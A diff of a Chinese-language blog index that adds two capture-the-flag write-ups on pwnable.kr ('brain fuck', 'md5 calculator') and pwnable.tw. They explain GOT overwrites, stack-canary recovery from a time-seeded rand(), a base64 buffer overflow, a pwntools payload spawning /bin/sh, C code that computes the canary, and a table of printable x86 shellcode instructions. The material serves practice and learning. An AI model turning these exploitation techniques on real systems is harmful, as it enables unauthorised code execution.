@@ -280,6 +280,274 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/10/pwnable-kr-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="YEL">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YEL's BLOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/08/10/pwnable-kr-1/" itemprop="url">pwnable_kr_1</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-10T19:45:45+08:00">
+                2017-08-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="brain-fuck"><a href="#brain-fuck" class="headerlink" title="brain fuck"></a>brain fuck</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>这题使用了六个个运算符来修改p指针以及所指的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;  p++</div><div class="line">&lt;  p--</div><div class="line">+  ++(*p)</div><div class="line">-  --(*p)</div><div class="line">.  putchar(*p)</div><div class="line">,  *p = getchar()</div></pre></td></tr></table></figure></p>
+<p>初始位置p-&gt;0x0804A0A0(tape)，这样我们可以根据前面的运算符来修改p指向的地址，如将p指向got，然后将got表内地址篡改到我们想要的地址，就可以控制程序流的执行。</p>
+<h3 id="0x02-leak"><a href="#0x02-leak" class="headerlink" title="0x02 leak"></a>0x02 leak</h3><p>利用”&lt;”、”&gt;”运算符将p移到got表，利用“.”运算符将got表内地址读取，即可完成地址泄露。</p>
+<h3 id="0x03-利用方法"><a href="#0x03-利用方法" class="headerlink" title="0x03 利用方法"></a>0x03 利用方法</h3><p><del>刚开始我的想法是将putchar的got读出来后，篡改putchar的got为system的地址，然而后面发现putchar的参数其实是一个字符而不是地址。想法一失败</del><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">   0x804863a &lt;do_brainfuck+94&gt;:	mov    eax,ds:0x804a080</div><div class="line">   0x804863f &lt;do_brainfuck+99&gt;:	movzx  eax,BYTE PTR [eax]</div><div class="line">=&gt; 0x8048642 &lt;do_brainfuck+102&gt;:	movsx  eax,al</div><div class="line">   0x8048645 &lt;do_brainfuck+105&gt;:	mov    DWORD PTR [esp],eax</div><div class="line">   0x8048648 &lt;do_brainfuck+108&gt;:	call   0x80484d0 &lt;putchar@plt&gt;</div></pre></td></tr></table></figure></p>
+<p><del>然后我想到的是选择strlen()作为got中修改的对象。</del><br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v6); ++i )</div><div class="line">  do_brainfuck(*((_BYTE *)&amp;v6 + i));</div></pre></td></tr></table></figure></p>
+<p><del>然后就是修改了一个字节以后这个循环就进行不下去了，错误推出</del></p>
+<p>只好去网上找前辈的方案：<a href="http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr.html" target="_blank" rel="external">rickgrey</a></p>
+<p>发现原来是这样利用的：<br>将got修改成下面的样子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">memset.got = gets_addr</div><div class="line">fgets.got = system_addr</div><div class="line">putchar.got = main_addr</div></pre></td></tr></table></figure></p>
+<p>这样在我们就改好got表时，使用“.”就可以将控制流牵引到main程序开始，由于got表内已经设置好了地址，在调用memset时就会调用gets()函数，然后我们输入‘/bin/sh’，就会将这串字符存到栈中，随后调用fgets()时，实际上是调用system，参数就是我们刚刚输入的字符串的地址。</p>
+<p>这里是<a href="https://github.com/yelleyee/pwnable_kr_exp/blob/master/bf_exp.py" target="_blank" rel="external">exp</a></p>
+<h2 id="md5-calculator"><a href="#md5-calculator" class="headerlink" title="md5 calculator"></a>md5 calculator</h2><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>刚开始硬是没找出来溢出点。。。倒是去了解了一下MD5和BASE64，还是去前一题前辈的博客去取经了<br><a href="http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr.html" target="_blank" rel="external">rickgrey</a><br>找到了溢出点：可以输入1024个BASE64字符，但是给decode后存储的字符空间只有0x200=512，1024个BASE64字符最多可以解码成1024/4*3 = 738 个字符，所以存在溢出。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">fgets(g_buf, <span class="number">1024</span>, <span class="built_in">stdin</span>);</div><div class="line"><span class="built_in">memset</span>(&amp;v3, <span class="number">0</span>, <span class="number">0x200</span>u);</div><div class="line">v0 = Base64Decode(g_buf, (<span class="keyword">int</span>)&amp;v3);</div></pre></td></tr></table></figure>
+<p>但是问题来了，process_hash()函数的栈上有canary，想要覆盖返回地址就需要把canary的值找到。<br>然后在my_hash()函数中找到了canary在验证码中也被使用，也就是验证码中有canary的信息，怎么提取是一个问题，<br>还是学前辈的姿势：my_hash()函数中使用了8次rand()函数，并取其中七个值和canary一起来构建验证码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">v4 = *MK_FP(__GS__, 20);</div><div class="line">for ( i = 0; i &lt;= 7; ++i )</div><div class="line">  *(_DWORD *)&amp;v3[4 * i] = rand();</div><div class="line">result = *(_DWORD *)&amp;v3[16]</div><div class="line">       - *(_DWORD *)&amp;v3[24]</div><div class="line">       + *(_DWORD *)&amp;v3[28]</div><div class="line">       + v4</div><div class="line">       + *(_DWORD *)&amp;v3[8]</div><div class="line">       - *(_DWORD *)&amp;v3[12]</div><div class="line">       + *(_DWORD *)&amp;v3[4]</div><div class="line">       + *(_DWORD *)&amp;v3[20];</div></pre></td></tr></table></figure></p>
+<p>然后就是前面的srand()函数使用的随机数种子是系统的时间。并且在第一次获取后没有改变，也就是说种子一直没有改变。<br>考虑到这个，由于产生的伪随机数，只要种子不变产生的随机数序列是不变的。这样我们可以通过获取系统时间，然后产生8个随机数，<br>将canary反推出来。这样就可以覆盖栈上的返回地址了，还可以设置参数。</p>
+<h3 id="0x02-leak-1"><a href="#0x02-leak-1" class="headerlink" title="0x02 leak"></a>0x02 leak</h3><p>这里我们不需要leak地址，因为函数中已经调用了system，所以我们的返回地址可以设置为<br>system.plt、或者是main()函数中的call system的地址。</p>
+<h3 id="0x03-exploit"><a href="#0x03-exploit" class="headerlink" title="0x03 exploit"></a>0x03 exploit</h3><p>反推canary源码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> t ;</div><div class="line">    <span class="keyword">int</span> c ;</div><div class="line">    <span class="keyword">int</span> canary = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> num[<span class="number">8</span>];</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    t = atoi(argv[<span class="number">1</span>]);</div><div class="line">    c = atoi(argv[<span class="number">2</span>]);</div><div class="line"></div><div class="line">    srand(t);</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">7</span>;i++)&#123;</div><div class="line">        num[i] = rand();</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d:%x\n"</span>,i,num[i]);</div><div class="line">    &#125;    </div><div class="line"></div><div class="line">    canary = c + num[<span class="number">6</span>] + num[<span class="number">3</span>] - num[<span class="number">1</span>] - num[<span class="number">2</span>] - num[<span class="number">4</span>] - num[<span class="number">5</span>] -num[<span class="number">7</span>];</div><div class="line">   <span class="built_in">printf</span>(<span class="string">"canary:%x\n"</span>,canary);</div><div class="line"></div><div class="line">   <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>设置栈分布：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">padding + canary + padding + ret_addr   +  padding + sh_str</div><div class="line">0x200     0x04     0x0c      system.plt    0x04    (0x0804B0E0 + 0x21c*4/3)</div></pre></td></tr></table></figure></p>
+<p>playload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">playload =  <span class="string">'A'</span>*<span class="number">0x200</span> + p32(canary)*<span class="number">4</span> + \</div><div class="line">            p32(system_plt) + p32(<span class="number">0x8048a00</span>) + p32(sh_str)</div><div class="line">r.sendline(b64e(playload) + <span class="string">'/bin/sh\x00'</span>)</div></pre></td></tr></table></figure>
+<p>这里是<a href="https://github.com/yelleyee/pwnable_kr_exp/blob/master/bf_exp.py" target="_blank" rel="external">exp</a><br><a href="https://github.com/yelleyee/pwnable_kr_exp/blob/master/canary" target="_blank" rel="external">canary</a></p>
+<p>另外一个有趣的东西是：如何获取服务器的时间，题目中给出的提示是</p>
+<p>hint : this service shares the same machine with pwnable.kr web service</p>
+<p>那么很自然的或者说是正统的做法是web获取服务器的时间，然后用这个时间来复现canary，但是时间确实是不准的<br>即使加入一个随机的延迟或者说超前都是很看概率的问题。最后就是将exp上传至服务器本地（使用其他题的账户），然后运行<br>我一直觉得这样是不行的原因是之前有个瓜皮传了一个pwn.py到/tmp/文件夹，然后在服务器上就不能使用pwntools，所以很难受。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/06/pwnable-tw-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="YEL">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YEL's BLOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/08/06/pwnable-tw-1/" itemprop="url">pwnable_tw_1(未完待续)</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-06T14:11:36+08:00">
+                2017-08-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h3><p>这题本来一点思路都没有，然后看到别人说的read_int可以是负数啊，这样就可以往任意地址写内容了~我们往GOT中写入我们的shellcode的地址，然后再去调用被覆盖的函数。</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>但是关键是shellcode的编写。输入会被一个叫is_printable()的函数过滤，函数原型如下。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">is_printable</span><span class="params">(<span class="keyword">char</span> *s)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [sp+Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; <span class="built_in">strlen</span>(s) &gt; i; ++i )        </div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( s[i] &lt;= <span class="number">31</span> || s[i] == <span class="number">127</span> )</div><div class="line">      <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这里虽然是s[i] &lt;= 31 以及 s[i] == 0x7F 这两个条件会被过滤，但是在实际的shellcode调试中发现，s[i] &lt;= 31 这个东西里面大有名堂，在汇编里面这个条件判别是这样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">.text:08048713                 cmp     al, 1Fh</div><div class="line">.text:08048715                 jle     short loc_8048726</div></pre></td></tr></table></figure></p>
+<p>然后我就发现s[i] = 0x8f,0xf7等等都是无法满足这个条件的，然后去一查：这个cmp是有符号数的compare，所以al=(1XXXXXXX)b都是负数。。。那么自然是小于0x1F的，所以我们可以使用shellcode字符只有 0x20 &lt; s[i] &lt; 0x7E，另外就是这题限制了shellcode的长度。无奈汇编能力只能看看代码，而且接触机器码又是少之又少的，所以这个题目搁置了好久。跑去打pwnable.kr，然而今天kr访问不上去了~又拾起此题。</p>
+<p>在网上找到这位仁兄的整理：<a href="http://pzhxbz.cn/?p=78" target="_blank" rel="external">pzhxbz的博客</a></p>
+<p>首先整理一下在可打印范围内能用的汇编指令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line">1.数据传送:</div><div class="line">push/pop eax…</div><div class="line">pusha/popa</div><div class="line"></div><div class="line">2.算术运算:</div><div class="line">inc/dec eax…</div><div class="line">sub al, 立即数</div><div class="line">sub byte ptr [eax… + 立即数], al dl…</div><div class="line">sub byte ptr [eax… + 立即数], ah dh…</div><div class="line">sub dword ptr [eax… + 立即数], esi edi</div><div class="line">sub word ptr [eax… + 立即数], si di</div><div class="line">sub al dl…, byte ptr [eax… + 立即数]</div><div class="line">sub ah dh…, byte ptr [eax… + 立即数]</div><div class="line">sub esi edi, dword ptr [eax… + 立即数]</div><div class="line">sub si di, word ptr [eax… + 立即数]</div><div class="line"></div><div class="line">3.逻辑运算:</div><div class="line">and al, 立即数</div><div class="line">and dword ptr [eax… + 立即数], esi edi</div><div class="line">and word ptr [eax… + 立即数], si di</div><div class="line">and ah dh…, byte ptr [ecx edx… + 立即数]</div><div class="line">and esi edi, dword ptr [eax… + 立即数]</div><div class="line">and si di, word ptr [eax… + 立即数]</div><div class="line"></div><div class="line">xor al, 立即数</div><div class="line">xor byte ptr [eax… + 立即数], al dl…</div><div class="line">xor byte ptr [eax… + 立即数], ah dh…</div><div class="line">xor dword ptr [eax… + 立即数], esi edi</div><div class="line">xor word ptr [eax… + 立即数], si di</div><div class="line">xor al dl…, byte ptr [eax… + 立即数]</div><div class="line">xor ah dh…, byte ptr [eax… + 立即数]</div><div class="line">xor esi edi, dword ptr [eax… + 立即数]</div><div class="line">xor si di, word ptr [eax… + 立即数]</div><div class="line"></div><div class="line">4.比较指令:</div><div class="line">cmp al, 立即数</div><div class="line">cmp byte ptr [eax… + 立即数], al dl…</div><div class="line">cmp byte ptr [eax… + 立即数], ah dh…</div><div class="line">cmp dword ptr [eax… + 立即数], esi edi</div><div class="line">cmp word ptr [eax… + 立即数], si di</div><div class="line">cmp al dl…, byte ptr [eax… + 立即数]</div><div class="line">cmp ah dh…, byte ptr [eax… + 立即数]</div><div class="line">cmp esi edi, dword ptr [eax… + 立即数]</div><div class="line">cmp si di, word ptr [eax… + 立即数]</div><div class="line"></div><div class="line">5.转移指令:</div><div class="line">push 56h</div><div class="line">pop eax</div><div class="line">cmp al, 43h</div><div class="line">jnz lable</div><div class="line"></div><div class="line">&lt;=&gt; jmp lable</div><div class="line"></div><div class="line">6.交换al, ah</div><div class="line">push eax</div><div class="line">xor ah, byte ptr [esp] // ah ^= al</div><div class="line">xor byte ptr [esp], ah // al ^= ah</div><div class="line">xor ah, byte ptr [esp] // ah ^= al</div><div class="line">pop eax</div><div class="line"></div><div class="line">7.清零:</div><div class="line">push 44h</div><div class="line">pop eax</div><div class="line">sub al, 44h ; eax = 0</div><div class="line"></div><div class="line">push esi</div><div class="line">push esp</div><div class="line">pop eax</div><div class="line">xor [eax], esi ; esi = 0</div></pre></td></tr></table></figure></p>
+<p>我自己也找到了一份asm转machine-code 的<a href="https://github.com/yelleyee/hello-world/blob/master/Coding_ASM_-_Intel_Instruction_Set_Codes_and_Cycles.pdf" target="_blank" rel="external">资料</a><br>然而太多太杂，一时间看不完而且不好找。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/03/pwnable-kr-0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -603,7 +871,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-count">4</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
